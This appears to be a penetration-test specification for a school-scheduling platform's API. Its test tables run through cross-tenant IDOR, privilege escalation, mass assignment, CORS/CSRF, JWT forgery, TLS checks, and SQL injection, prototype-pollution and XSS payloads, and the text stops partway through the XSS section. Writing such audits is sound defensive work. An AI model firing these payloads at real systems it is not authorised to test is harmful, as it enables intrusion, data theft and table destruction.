# Security Audit Specification: Scheduling Module

> **Leg 5 of the `/e2e-full` release-readiness pack.** This spec adversarially exercises the Scheduling module against OWASP Top 10 (2021), injection vectors, authentication hardening, the full permission matrix, encrypted-field leak surfaces, business-logic abuse, and the unique attack surface introduced by the Python CP-SAT solver sidecar. It is runnable by an internal security engineer, a paid pen-tester, or an OWASP ZAP / Burp-Suite-driven harness.

**Module:** Scheduling (auto-scheduler, runs, schedules, timetables, substitutions, exam scheduling, scenarios, calendar subscriptions)
**Threat model:** Hostile multi-tenant SaaS — assume one tenant on the platform is fully compromised and is actively probing every endpoint, every header, every payload field for leaks into another tenant. The most valuable target is **the solver sidecar** (`SOLVER_PY_URL`) and the **`scheduling_run.config_snapshot` / `result_json` JSONB blobs** which carry the entire scheduling intelligence of the school.
**Target executor:** Security engineer or pen-tester; automation via OWASP ZAP, Burp Community, custom curl + jq scripts, and `pg_basic_audit` style checks against staging Postgres.
**Base URL:** staging (`https://api-staging.edupod.app`, `https://staging.edupod.app`) and production (only after staging clean).

---

## Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [Out of scope](#2-out-of-scope)
3. [OWASP Top 10 — A01 Broken Access Control](#3-owasp-a01)
4. [OWASP Top 10 — A02 Cryptographic Failures](#4-owasp-a02)
5. [OWASP Top 10 — A03 Injection](#5-owasp-a03)
6. [OWASP Top 10 — A04 Insecure Design](#6-owasp-a04)
7. [OWASP Top 10 — A05 Security Misconfiguration](#7-owasp-a05)
8. [OWASP Top 10 — A06 Vulnerable & Outdated Components](#8-owasp-a06)
9. [OWASP Top 10 — A07 Identification & Authentication Failures](#9-owasp-a07)
10. [OWASP Top 10 — A08 Software & Data Integrity Failures](#10-owasp-a08)
11. [OWASP Top 10 — A09 Security Logging & Monitoring Failures](#11-owasp-a09)
12. [OWASP Top 10 — A10 Server-Side Request Forgery](#12-owasp-a10)
13. [Permission matrix — every endpoint × every role (hostile)](#13-permission-matrix)
14. [RLS bypass attempts](#14-rls-bypass-attempts)
15. [Injection fuzz — every text input](#15-injection-fuzz)
16. [Business-logic abuse](#16-business-logic-abuse)
17. [Encrypted / sensitive field round-trip](#17-encrypted-fields)
18. [Auth hardening](#18-auth-hardening)
19. [HTTP hardening headers](#19-http-hardening)
20. [Rate limiting & DoS surface](#20-rate-limiting)
21. [Severity tally](#21-severity-tally)
22. [Observations & gaps spotted](#22-observations)
23. [Sign-off](#23-sign-off)

---

## 1. Prerequisites

- Two tenants provisioned per the other legs:
  - **`nhqs`** = victim tenant (real production-shaped data, 2 academic years, ≥ 30 staff, ≥ 100 schedule rows, ≥ 1 completed scheduling_run with rich `result_json`)
  - **`stress-d`** = attacker tenant (freshly minted, only the attacker users)
- At least one user in every role per tenant: `school_owner`, `school_principal`, `school_vice_principal`, `school_admin`, `teacher` (with `staff_profile`), `front_office`, `accounting`, `parent`, `student`
- One "passive" attacker account: a freshly-created student in `stress-d` with no scheduling permissions
- One "lateral" attacker account: a teacher in `stress-d` with `schedule.report_own_absence`, `schedule.respond_to_offer`, and `schedule.view_own` (to test horizontal escalation toward admin-tier endpoints)
- Burp Suite / OWASP ZAP configured as an HTTPS proxy with the CA cert trusted
- Valid JWTs for each role + one expired + one tampered token + one `alg=none` forged token prepared in advance (`scripts/forge-jwt.sh`)
- Direct `psql` read-only access to staging DB (`edupod_readonly` role) for RLS-bypass verification — **never** to production
- A working SOLVER_PY_URL pointing at staging solver sidecar (for SSRF testing)
- `nmap`, `sslscan`, `testssl.sh`, `nikto`, `wfuzz`, `ffuf` installed on the auditor's box
- A scratch S3 bucket the auditor controls (for SSRF / out-of-band callback testing)

---

## 2. Out of Scope

This spec covers security. It does **NOT** cover:

- Functional correctness of the scheduling algorithm (covered by `/E2E` admin-view, teacher-view specs)
- RLS happy-path correctness (covered by integration spec — but this leg tests **adversarial** RLS attacks)
- Performance / load (covered by perf spec — though pathological-payload DoS IS tested here)
- Solver mathematical correctness (covered by worker spec — though solver-as-attack-surface IS tested here)
- Physical / infrastructure security (out of scope for app-level pack)
- Hetzner Object Storage bucket policy review (separate pen-test engagement)

---

## 3. OWASP Top 10 — A01 Broken Access Control

The Scheduling module exposes **74 distinct endpoints** spread across 14 controllers. A01 is the largest and most critical attack surface here because:

- Every solver run leaks the full school intelligence (teacher salaries-by-proxy via load-distribution, room maps, every student's class affinity)
- Apply / discard mutate the live timetable for thousands of students
- Cross-tenant solver-run ID guessing would be catastrophic (full curriculum disclosure)

### 3.1 Cross-tenant access (IDOR) — direct ID swap

| #           | Attack                                                                                                                | Surface                                         | Expected                                       | Severity | Pass/Fail |
| ----------- | --------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------- | ---------------------------------------------- | -------- | --------- |
| SCH-SEC-001 | As `stress-d` school_owner: `GET /v1/scheduling-runs/{nhqs_run_id}`                                                   | scheduling_runs                                 | 404 (never 200, never 403 with body)           | P0       |           |
| SCH-SEC-002 | As `stress-d` school_owner: `POST /v1/scheduling-runs/{nhqs_run_id}/apply` body `{expected_updated_at}`               | scheduling_runs apply                           | 404; no schedules written                      | P0       |           |
| SCH-SEC-003 | As `stress-d` school_owner: `POST /v1/scheduling-runs/{nhqs_run_id}/discard`                                          | scheduling_runs discard                         | 404; nhqs run state unchanged                  | P0       |           |
| SCH-SEC-004 | As `stress-d` school_owner: `POST /v1/scheduling-runs/{nhqs_run_id}/cancel`                                           | scheduling_runs cancel                          | 404                                            | P0       |           |
| SCH-SEC-005 | As `stress-d` school_owner: `GET /v1/scheduling-runs/{nhqs_run_id}/diagnostics`                                       | diagnostics_refined_report leak                 | 404                                            | P0       |           |
| SCH-SEC-006 | As `stress-d` school_owner: `POST /v1/scheduling-runs/{nhqs_run_id}/diagnostics/simulate`                             | simulate                                        | 404                                            | P0       |           |
| SCH-SEC-007 | As `stress-d` school_owner: `PATCH /v1/scheduling-runs/{nhqs_run_id}/adjustments`                                     | adjustments                                     | 404                                            | P0       |           |
| SCH-SEC-008 | As `stress-d` school_owner: `GET /v1/schedules/{nhqs_schedule_id}`                                                    | schedules                                       | 404                                            | P0       |           |
| SCH-SEC-009 | As `stress-d` school_owner: `PATCH /v1/schedules/{nhqs_schedule_id}` with valid body                                  | schedules update                                | 404                                            | P0       |           |
| SCH-SEC-010 | As `stress-d` school_owner: `DELETE /v1/schedules/{nhqs_schedule_id}`                                                 | schedules delete                                | 404                                            | P0       |           |
| SCH-SEC-011 | As `stress-d` school_owner: `POST /v1/schedules/{nhqs_schedule_id}/pin`                                               | schedules pin                                   | 404                                            | P0       |           |
| SCH-SEC-012 | As `stress-d` school_owner: `POST /v1/schedules/{nhqs_schedule_id}/unpin`                                             | schedules unpin                                 | 404                                            | P0       |           |
| SCH-SEC-013 | As `stress-d` school_owner: `POST /v1/schedules/bulk-pin` `{schedule_ids: [<nhqs_schedule_id>...]}`                   | schedules bulk-pin                              | 404 OR partial-success-with-zero-rows-affected | P0       |           |
| SCH-SEC-014 | As `stress-d` school_owner: `GET /v1/scheduling/curriculum-requirements/{nhqs_req_id}`                                | curriculum_requirement                          | 404                                            | P0       |           |
| SCH-SEC-015 | As `stress-d` school_owner: `PATCH /v1/scheduling/curriculum-requirements/{nhqs_req_id}` body                         | curriculum_requirement update                   | 404                                            | P0       |           |
| SCH-SEC-016 | As `stress-d` school_owner: `DELETE /v1/scheduling/curriculum-requirements/{nhqs_req_id}`                             | curriculum_requirement delete                   | 404                                            | P0       |           |
| SCH-SEC-017 | As `stress-d` school_owner: `PATCH /v1/scheduling/teacher-competencies/{nhqs_competency_id}`                          | teacher_competency                              | 404                                            | P0       |           |
| SCH-SEC-018 | As `stress-d` school_owner: `DELETE /v1/scheduling/teacher-competencies/{nhqs_competency_id}`                         | teacher_competency delete                       | 404                                            | P0       |           |
| SCH-SEC-019 | As `stress-d` school_owner: `DELETE /v1/scheduling/teacher-competencies/by-teacher/{nhqs_staff_profile_id}`           | teacher_competency mass-delete                  | 404                                            | P0       |           |
| SCH-SEC-020 | As `stress-d` school_owner: `PATCH /v1/scheduling/substitute-competencies/{nhqs_id}`                                  | substitute_teacher_competency                   | 404                                            | P0       |           |
| SCH-SEC-021 | As `stress-d` school_owner: `DELETE /v1/scheduling/substitute-competencies/{nhqs_id}`                                 | substitute_teacher_competency delete            | 404                                            | P0       |           |
| SCH-SEC-022 | As `stress-d` school_owner: `PATCH /v1/scheduling/break-groups/{nhqs_id}`                                             | break_group                                     | 404                                            | P0       |           |
| SCH-SEC-023 | As `stress-d` school_owner: `DELETE /v1/scheduling/break-groups/{nhqs_id}`                                            | break_group delete                              | 404                                            | P0       |           |
| SCH-SEC-024 | As `stress-d` school_owner: `DELETE /v1/scheduling/room-closures/{nhqs_id}`                                           | room_closure                                    | 404                                            | P0       |           |
| SCH-SEC-025 | As `stress-d` school_owner: `DELETE /v1/scheduling/teacher-config/{nhqs_id}`                                          | teacher_scheduling_config                       | 404                                            | P0       |           |
| SCH-SEC-026 | As `stress-d` school_owner: `DELETE /v1/scheduling/absences/{nhqs_absence_id}`                                        | teacher_absence                                 | 404                                            | P0       |           |
| SCH-SEC-027 | As `stress-d` school_owner: `POST /v1/scheduling/absences/{nhqs_absence_id}/cancel`                                   | teacher_absence cancel                          | 404                                            | P0       |           |
| SCH-SEC-028 | As `stress-d` school_owner: `POST /v1/scheduling/absences/{nhqs_absence_id}/cancel-own`                               | teacher_absence cancel-own (still cross-tenant) | 404                                            | P0       |           |
| SCH-SEC-029 | As `stress-d` school_owner: `GET /v1/scheduling/absences/{nhqs_absence_id}/substitutes`                               | substitution suggestion leak                    | 404                                            | P0       |           |
| SCH-SEC-030 | As `stress-d` school_owner: `GET /v1/scheduling/absences/{nhqs_absence_id}/substitutes/ai`                            | AI sub ranking leak                             | 404                                            | P0       |           |
| SCH-SEC-031 | As `stress-d` teacher: `POST /v1/scheduling/offers/{nhqs_offer_id}/accept`                                            | substitution_offer accept                       | 404 (and offer remains pending)                | P0       |           |
| SCH-SEC-032 | As `stress-d` teacher: `POST /v1/scheduling/offers/{nhqs_offer_id}/decline`                                           | substitution_offer decline                      | 404                                            | P0       |           |
| SCH-SEC-033 | As `stress-d` school_owner: `PUT /v1/scheduling/exam-sessions/{nhqs_session_id}` body                                 | exam_session                                    | 404                                            | P0       |           |
| SCH-SEC-034 | As `stress-d` school_owner: `DELETE /v1/scheduling/exam-sessions/{nhqs_session_id}`                                   | exam_session delete                             | 404                                            | P0       |           |
| SCH-SEC-035 | As `stress-d` school_owner: `POST /v1/scheduling/exam-sessions/{nhqs_session_id}/publish`                             | exam publish                                    | 404                                            | P0       |           |
| SCH-SEC-036 | As `stress-d` school_owner: `PUT /v1/scheduling/scenarios/{nhqs_scenario_id}` body                                    | scheduling_scenario                             | 404                                            | P0       |           |
| SCH-SEC-037 | As `stress-d` school_owner: `POST /v1/scheduling/scenarios/{nhqs_scenario_id}/solve`                                  | scenario solver invocation                      | 404; no solver call made                       | P0       |           |
| SCH-SEC-038 | As `stress-d` school_owner: `DELETE /v1/scheduling/calendar-tokens/{nhqs_token_id}` (own tenant header, foreign uuid) | calendar_subscription_token                     | 404                                            | P0       |           |
| SCH-SEC-039 | Burp Intruder: fuzz 5,000 random UUIDs in `/v1/scheduling-runs/{id}` as stress-d owner                                | scheduling_runs                                 | 404 rate = 100%; zero 200; zero 5xx            | P0       |           |
| SCH-SEC-040 | Burp Intruder: fuzz 5,000 random UUIDs in `/v1/schedules/{id}` as stress-d owner                                      | schedules                                       | 404 rate = 100%                                | P0       |           |
| SCH-SEC-041 | Burp Intruder: fuzz 5,000 random UUIDs in `/v1/scheduling/exam-sessions/{id}` as stress-d owner                       | exam_session                                    | 404 rate = 100%                                | P0       |           |

### 3.2 Horizontal privilege escalation (same tenant, wrong owner)

| #           | Attack                                                                                                          | Surface                                       | Expected                                         | Severity | Pass/Fail |
| ----------- | --------------------------------------------------------------------------------------------------------------- | --------------------------------------------- | ------------------------------------------------ | -------- | --------- |
| SCH-SEC-042 | As teacher A in nhqs: `POST /v1/scheduling/offers/{teacher_B_offer_id}/accept`                                  | substitution_offer ownership                  | 404 or 403 OFFER_NOT_OWNED                       | P0       |           |
| SCH-SEC-043 | As teacher A in nhqs: `POST /v1/scheduling/offers/{teacher_B_offer_id}/decline`                                 | substitution_offer ownership                  | 404 or 403                                       | P0       |           |
| SCH-SEC-044 | As teacher A in nhqs: `POST /v1/scheduling/absences/{teacher_B_absence_id}/cancel-own`                          | absence ownership                             | 403 NOT_OWN_ABSENCE (cancel-own checks reporter) | P0       |           |
| SCH-SEC-045 | As teacher A: `GET /v1/scheduling/timetable/teacher/{teacher_B_staff_id}` (admin-tier endpoint)                 | personal-timetable leak                       | 403 (lacks schedule.view_reports)                | P0       |           |
| SCH-SEC-046 | As teacher A: `GET /v1/timetables/teacher/{teacher_B_staff_profile_id}` with view_own only                      | TimetablesController owner check              | 403 — view_own scoped to self only               | P0       |           |
| SCH-SEC-047 | As parent A (linked to student S1): `GET /v1/timetables/student/{student_S2_id}` (S2 is another parent's child) | timetables student parent-link check          | 403 NOT_LINKED_PARENT                            | P0       |           |
| SCH-SEC-048 | As teacher A: `DELETE /v1/scheduling/calendar-tokens/{teacher_B_token_id}`                                      | calendar_subscription_token owner             | 404 or 403                                       | P0       |           |
| SCH-SEC-049 | As teacher A: `POST /v1/scheduling/calendar-tokens` `{entity_type: 'teacher', entity_id: <teacher_B_staff_id>}` | token creation for someone else's calendar    | 403 CANNOT_CREATE_FOR_OTHER_STAFF                | P0       |           |
| SCH-SEC-050 | As teacher A: `POST /v1/scheduling/calendar-tokens` `{entity_type: 'class', entity_id: <class_not_taught>}`     | token creation for class teacher does not own | 403 or 200 if class tokens are open (DOCUMENT)   | P1       |           |
| SCH-SEC-051 | As teacher A: `GET /v1/scheduling/timetable/my` with `?staffId=<teacher_B>` query param                         | my-timetable query-param spoofing             | Server ignores body/query, derives from JWT user | P0       |           |

### 3.3 Vertical privilege escalation (lower role attempts admin endpoints)

| #           | Attack                                                                | Surface                | Expected                            | Severity | Pass/Fail |
| ----------- | --------------------------------------------------------------------- | ---------------------- | ----------------------------------- | -------- | --------- |
| SCH-SEC-052 | As teacher: `POST /v1/scheduling-runs` body `{academic_year_id}`      | trigger solver run     | 403 (lacks schedule.run_auto)       | P0       |           |
| SCH-SEC-053 | As teacher: `POST /v1/scheduling-runs/{id}/apply` body                | apply run              | 403 (lacks schedule.apply_auto)     | P0       |           |
| SCH-SEC-054 | As teacher: `POST /v1/scheduling/runs/{id}/discard`                   | discard run            | 403                                 | P0       |           |
| SCH-SEC-055 | As teacher: `POST /v1/scheduling/curriculum-requirements/bulk-upsert` | bulk schedule config   | 403                                 | P0       |           |
| SCH-SEC-056 | As teacher: `POST /v1/schedules` body                                 | manual schedule entry  | 403 (lacks schedule.manage)         | P0       |           |
| SCH-SEC-057 | As teacher: `POST /v1/schedules/bulk-pin` body                        | pin                    | 403                                 | P0       |           |
| SCH-SEC-058 | As teacher: `POST /v1/scheduling/swaps/execute` body                  | swap                   | 403                                 | P0       |           |
| SCH-SEC-059 | As teacher: `POST /v1/scheduling/emergency-change` body               | emergency change       | 403                                 | P0       |           |
| SCH-SEC-060 | As teacher: `POST /v1/scheduling/exam-sessions` body                  | exam admin             | 403 (lacks schedule.manage_exams)   | P0       |           |
| SCH-SEC-061 | As teacher: `POST /v1/scheduling/scenarios` body                      | scenario create        | 403                                 | P0       |           |
| SCH-SEC-062 | As teacher: `GET /v1/scheduling/teachers` (admin staff lookup)        | staff list             | 403 (lacks schedule.manage_substit) | P0       |           |
| SCH-SEC-063 | As parent: `GET /v1/scheduling-runs`                                  | list runs              | 403                                 | P0       |           |
| SCH-SEC-064 | As parent: `GET /v1/scheduling/cover-reports`                         | cover report           | 403                                 | P0       |           |
| SCH-SEC-065 | As student: `POST /v1/scheduling/absences`                            | absence report         | 403                                 | P0       |           |
| SCH-SEC-066 | As student: `GET /v1/scheduling/timetable/teacher/{any_staff_id}`     | teacher timetable peek | 403                                 | P0       |           |
| SCH-SEC-067 | As accounting: `POST /v1/scheduling-runs`                             | wrong-vertical role    | 403                                 | P1       |           |
| SCH-SEC-068 | As front_office: `POST /v1/schedules`                                 | wrong-vertical role    | 403                                 | P1       |           |

### 3.4 Permission field injection (mass-assignment)

| #           | Attack                                                                                                   | Surface                                  | Expected                                                             | Severity | Pass/Fail |
| ----------- | -------------------------------------------------------------------------------------------------------- | ---------------------------------------- | -------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-069 | `POST /v1/scheduling-runs` body `{academic_year_id, tenant_id: <victim_tenant_id>}` — server MUST ignore | mass assignment                          | tenant_id from JWT used; row inserted under attacker tenant only     | P0       |           |
| SCH-SEC-070 | `POST /v1/scheduling/absences/self-report` body `{date, staff_id: <other_staff_id>, reason}`             | self-report sneaks staff_id              | Field ignored; absence recorded against JWT user's staff_profile     | P0       |           |
| SCH-SEC-071 | `POST /v1/scheduling-runs/{id}/apply` body `{expected_updated_at, applied_by_user_id: <other_uuid>}`     | applied_by spoof                         | Field ignored; server uses JWT user_id                               | P0       |           |
| SCH-SEC-072 | `POST /v1/scheduling/absences` body `{...required, reported_by_user_id: <other_uuid>}`                   | reporter spoof                           | Field ignored                                                        | P0       |           |
| SCH-SEC-073 | `POST /v1/scheduling/calendar-tokens` body `{entity_type, entity_id, token: 'attacker-chosen'}`          | token-value spoof                        | Server-generated 64-hex token; client value ignored                  | P0       |           |
| SCH-SEC-074 | `POST /v1/scheduling-runs` body `{academic_year_id, status: 'completed', result_json: {...}}`            | inject completed run with fake schedules | Fields ignored; row inserted as `queued`; result_json null at insert | P0       |           |
| SCH-SEC-075 | `PATCH /v1/scheduling/teacher-competencies/{id}` body `{class_id, staff_profile_id: <other_staff>}`      | swap competency owner                    | staff_profile_id ignored (only class_id mutable per Zod)             | P0       |           |
| SCH-SEC-076 | `POST /v1/schedules` body `{..., source: 'pinned', is_pinned: true, scheduling_run_id: <victim_run>}`    | sneak cross-tenant scheduling_run_id     | scheduling_run_id either ignored or 404 on FK; never persists        | P0       |           |
| SCH-SEC-077 | `POST /v1/scheduling-runs/{id}/apply` body `{expected_updated_at: '2099-01-01'}`                         | optimistic-lock bypass via future date   | 409 OPTIMISTIC_LOCK_MISMATCH                                         | P1       |           |

### 3.5 Force-browse protected routes (no JWT)

| #           | Attack                                                             | Surface                                                                          | Expected                             | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------ | -------------------------------------------------------------------------------- | ------------------------------------ | -------- | --------- |
| SCH-SEC-078 | Unauthenticated: `GET /v1/scheduling-runs`                         | list runs                                                                        | 401                                  | P0       |           |
| SCH-SEC-079 | Unauthenticated: `POST /v1/scheduling-runs`                        | create run                                                                       | 401                                  | P0       |           |
| SCH-SEC-080 | Unauthenticated: `GET /v1/schedules`                               | list schedules                                                                   | 401                                  | P0       |           |
| SCH-SEC-081 | Unauthenticated: `POST /v1/schedules`                              | create schedule                                                                  | 401                                  | P0       |           |
| SCH-SEC-082 | Unauthenticated: `GET /v1/scheduling/timetable/my`                 | own timetable                                                                    | 401                                  | P0       |           |
| SCH-SEC-083 | Unauthenticated: `GET /v1/scheduling-dashboard/overview`           | dashboard                                                                        | 401                                  | P0       |           |
| SCH-SEC-084 | Unauthenticated: `GET /v1/calendar/{tenantId}/{token}.ics` (valid) | iCal public                                                                      | 200 (token-based; documented)        | —        |           |
| SCH-SEC-085 | Unauthenticated: `GET /v1/calendar/{tenantId}/{wrong_token}.ics`   | iCal wrong token                                                                 | 404 (not 401, do not leak existence) | P0       |           |
| SCH-SEC-086 | Unauthenticated: `GET /v1/calendar/{tenantId}/.ics` (empty token)  | iCal empty token                                                                 | 404                                  | P0       |           |
| SCH-SEC-087 | Unauthenticated: `GET /v1/scheduling/substitution-board`           | board (per inventory was listed as 'no auth' on FE, but BE-side gate must apply) | 401 unless documented public         | P1       |           |

### 3.6 CORS / CSRF

| #           | Attack                                                                  | Surface          | Expected                                                     | Severity | Pass/Fail |
| ----------- | ----------------------------------------------------------------------- | ---------------- | ------------------------------------------------------------ | -------- | --------- |
| SCH-SEC-088 | `OPTIONS /v1/scheduling-runs` from `Origin: https://evil.com`           | CORS             | No `Access-Control-Allow-Origin: *`; specific allowlist only | P1       |           |
| SCH-SEC-089 | XHR from `evil.com` with user's refresh-token cookie → POST run         | CSRF             | Browser blocks (cookie SameSite=Strict / Lax)                | P0       |           |
| SCH-SEC-090 | JWT in httpOnly cookie unreadable from `document.cookie`                | XSS-cookie       | Verified                                                     | P0       |           |
| SCH-SEC-091 | `POST /v1/scheduling-runs` with `Origin: null` and JWT in Authorization | header-only auth | 200 (CORS doesn't gate header-auth — but test is documented) | P2       |           |

---

## 4. OWASP Top 10 — A02 Cryptographic Failures

The Scheduling module has **NO encrypted-at-app-layer fields per inventory** (no Stripe keys, no bank details, no TOTP secrets). However, the calendar subscription token is a long-lived bearer token with no rotation, the JWT carries `tenant_id`, and the solver sidecar URL is read from env. All of these are A02 surface.

### 4.1 TLS

| #           | Assertion                                                        | Surface    | Expected                                          | Severity | Pass/Fail |
| ----------- | ---------------------------------------------------------------- | ---------- | ------------------------------------------------- | -------- | --------- |
| SCH-SEC-092 | HTTPS enforced on `api.edupod.app` and `staging.edupod.app`      | edge TLS   | HTTP → 301 to HTTPS; HSTS present                 | P0       |           |
| SCH-SEC-093 | TLS ≥ 1.2; 1.0 / 1.1 / SSLv3 disabled                            | edge TLS   | `sslscan` reports only 1.2 / 1.3                  | P0       |           |
| SCH-SEC-094 | No RC4, 3DES, NULL, EXPORT, or anonymous ciphers                 | edge TLS   | Verified via `testssl.sh`                         | P1       |           |
| SCH-SEC-095 | Edge → API (Hetzner internal) traffic is encrypted or local-only | API hop    | Documented; if plaintext, only on private network | P1       |           |
| SCH-SEC-096 | API → solver sidecar (`SOLVER_PY_URL`) is HTTPS or loopback      | solver hop | `localhost:5557` OR HTTPS                         | P0       |           |
| SCH-SEC-097 | Calendar `webcal://` endpoint accessible over HTTPS only         | iCal       | 301 from http to https                            | P1       |           |

### 4.2 Calendar subscription token strength

| #           | Assertion                                                                               | Expected                                            | Severity | Pass/Fail |
| ----------- | --------------------------------------------------------------------------------------- | --------------------------------------------------- | -------- | --------- |
| SCH-SEC-098 | Token is 64 hex chars (256 bits) drawn from CSPRNG                                      | Verified — `crypto.randomBytes(32).toString('hex')` | P0       |           |
| SCH-SEC-099 | Token comparison uses constant-time check (`timingSafeEqual`)                           | Verified — no `===` on token                        | P1       |           |
| SCH-SEC-100 | Tokens stored hashed (sha256) at rest, not plaintext                                    | Acceptable risk if not, but document                | P2       |           |
| SCH-SEC-101 | Token revocation immediate (no caching) — DELETE → next .ics → 404                      | Verified                                            | P1       |           |
| SCH-SEC-102 | Token cannot be forged by guessing (5,000 random tokens against valid tenantId)         | 100% 404                                            | P0       |           |
| SCH-SEC-103 | Token-to-tenantId binding: token T from tenant A returns 404 if used with tenant B path | 404                                                 | P0       |           |
| SCH-SEC-104 | iCal endpoint does not leak existence of tenantId on bad token (no timing diff > 50ms)  | Verified                                            | P2       |           |

### 4.3 JWT cryptography

| #           | Assertion                                                                             | Expected | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------------- | -------- | -------- | --------- |
| SCH-SEC-105 | JWT `alg=HS256` (or RS256), never `alg=none`                                          | Verified | P0       |           |
| SCH-SEC-106 | JWT secret ≥ 256 bits, randomly generated, stored in env (not code)                   | Verified | P0       |           |
| SCH-SEC-107 | JWT carries `tenant_id` claim; mismatch with route raises 401                         | Verified | P0       |           |
| SCH-SEC-108 | JWT short-lived (≤ 15 min); refresh token in httpOnly cookie                          | Verified | P0       |           |
| SCH-SEC-109 | Refresh token rotation: re-using old refresh after rotation invalidates entire family | Verified | P1       |           |

### 4.4 Secret storage

| #           | Assertion                                                               | Expected                                 | Severity | Pass/Fail |
| ----------- | ----------------------------------------------------------------------- | ---------------------------------------- | -------- | --------- |
| SCH-SEC-110 | `SOLVER_PY_URL`, `JWT_SECRET`, `DATABASE_URL` are env vars, not in git  | `git log --all -S 'SOLVER_PY_URL'` clean | P0       |           |
| SCH-SEC-111 | API responses never echo `SOLVER_PY_URL`                                | Verified across all error paths          | P0       |           |
| SCH-SEC-112 | Sentry / log aggregation strips Authorization headers and cookie values | Verified in `apps/api/src/instrument.ts` | P0       |           |
| SCH-SEC-113 | Solver `result_json` is NOT logged to Sentry / stdout in entirety       | Verified                                 | P1       |           |

### 4.5 Data at rest

| #           | Assertion                                                                 | Expected                                 | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------- | ---------------------------------------- | -------- | --------- |
| SCH-SEC-114 | Hetzner Postgres volume encrypted at rest (LUKS / provider-managed)       | Documented in deployment-architecture.md | P1       |           |
| SCH-SEC-115 | Postgres backups encrypted; restored to staging only with rotated secrets | Documented                               | P1       |           |
| SCH-SEC-116 | `result_json` JSONB blobs not exported to plain S3 without encryption     | Verified — no scheduling export to S3    | P1       |           |

---

## 5. OWASP Top 10 — A03 Injection

Scheduling has many text fields, but the highest-value injection sites are:

- **`config_snapshot` JSONB** — solver input, attacker-controlled via run trigger
- **`result_json` JSONB** — solver output (attacker can't inject directly, but verify path-traversal in keys)
- **`pin_reason`, `cancellation_reason`, `failure_reason`** — free-text, rendered in admin UI
- **iCal generator** — could inject `BEGIN:VEVENT` headers via teacher/class names
- **Calendar token route param** — must be sanitized at the URL layer

### 5.1 SQL injection

| #           | Input                                                                                       | Expected                                                                                                             | Severity                            | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- | ----------------------------------- | --------- | --- |
| SCH-SEC-117 | Body field `pin_reason = "'; DROP TABLE schedule;--"`                                       | Persisted verbatim; DB intact; Prisma parameter-binds                                                                | P0                                  |           |
| SCH-SEC-118 | Body field `cancellation_reason = "' OR '1'='1"`                                            | Persisted verbatim                                                                                                   | P0                                  |           |
| SCH-SEC-119 | Query param `?academic_year_id=00000000-0000-0000-0000-000000000000' OR '1'='1'--`          | ParseUUIDPipe rejects 400                                                                                            | P0                                  |           |
| SCH-SEC-120 | UUID route param `/v1/scheduling-runs/00000000-0000-0000-0000-000000000000'%20OR%20'1'='1'` | ParseUUIDPipe rejects 400                                                                                            | P0                                  |           |
| SCH-SEC-121 | Sort param `?sort=created_at;DROP TABLE scheduling_run`                                     | 422 Zod enum mismatch (no sort param OR enum-bound)                                                                  | P0                                  |           |
| SCH-SEC-122 | `?status=queued')%20UNION%20SELECT%20*%20FROM%20users--`                                    | 422 enum mismatch                                                                                                    | P0                                  |           |
| SCH-SEC-123 | `grep -rn 'executeRawUnsafe\\                                                               | queryRawUnsafe' apps/api/src/modules/scheduling apps/api/src/modules/schedules apps/api/src/modules/scheduling-runs` | Zero matches outside RLS middleware | P0        |     |
| SCH-SEC-124 | Lint rule `no-raw-sql-outside-rls` blocks new `$executeRawUnsafe` introductions             | `pnpm lint` fails CI on attempted insertion                                                                          | P0                                  |           |
| SCH-SEC-125 | `?date_from=2026-01-01';SELECT pg_sleep(10)--` (time-based blind)                           | Zod date refine rejects → 422; no 10s delay observed                                                                 | P0                                  |           |
| SCH-SEC-126 | `?staff_id=00000000-0000-0000-0000-000000000000) OR EXISTS (SELECT * FROM users)--`         | UUID validator rejects                                                                                               | P0                                  |           |

### 5.2 JSON injection / JSONB attacks (config_snapshot, result_json, diagnostics_refined_report)

| #           | Input                                                                                    | Expected                                              | Severity | Pass/Fail |
| ----------- | ---------------------------------------------------------------------------------------- | ----------------------------------------------------- | -------- | --------- |
| SCH-SEC-127 | `POST /v1/scheduling-runs` body with extra key `__proto__: {isAdmin: true}`              | Zod strips unknown keys; no prototype pollution       | P0       |           |
| SCH-SEC-128 | Body with `constructor: {prototype: {isAdmin: true}}`                                    | Stripped or rejected                                  | P0       |           |
| SCH-SEC-129 | Body with `solver_seed: "abc"` (string, not int)                                         | 422 Zod                                               | P1       |           |
| SCH-SEC-130 | Body with `solver_seed: 9999999999999999` (overflow)                                     | 422 Zod or persisted as bigint-safe                   | P1       |           |
| SCH-SEC-131 | `POST /v1/scheduling/scenarios` body `{config_snapshot: {<malicious nested 1000 deep>}}` | Zod refine on depth OR Postgres jsonb depth limit     | P1       |           |
| SCH-SEC-132 | Body with `config_snapshot` containing 5MB of nested objects                             | 413 Payload Too Large (body size cap ≤ 1MB)           | P1       |           |
| SCH-SEC-133 | Body with `result_json` field on POST (not on response) — server should ignore           | Field ignored; result_json null at insert             | P0       |           |
| SCH-SEC-134 | Body with NUL byte: `pin_reason: "abc\\u0000def"`                                        | Postgres rejects (no `\\u0000` in text); 422 or strip | P1       |           |
| SCH-SEC-135 | Body with high-surrogate without low: `pin_reason: "\\uD800"` (lone surrogate)           | Persisted or rejected; never crashes server           | P2       |           |

### 5.3 XSS

| #           | Input                                                                                         | Expected                                               | Severity | Pass/Fail |
| ----------- | --------------------------------------------------------------------------------------------- | ------------------------------------------------------ | -------- | --------- |
| SCH-SEC-136 | `pin_reason: <script>alert(1)</script>`                                                       | Persisted verbatim; UI renders escaped (React)         | P0       |           |
| SCH-SEC-137 | `cancellation_reason: <img src=x onerror=alert(1)>`                                           | Escaped on render in admin substitutions board         | P0       |           |
| SCH-SEC-138 | Exam session `name: <svg onload=alert(1)>`                                                    | Escaped                                                | P0       |           |
| SCH-SEC-139 | Scenario `name: <iframe src=javascript:alert(1)>`                                             | Escaped                                                | P0       |           |
| SCH-SEC-140 | Break group `name: <a href=javascript:alert(1)>x</a>`                                         | Escaped                                                | P0       |           |
| SCH-SEC-141 | Teacher staff display name (from people table) with XSS payload → flows into timetable view   | Escaped                                                | P0       |           |
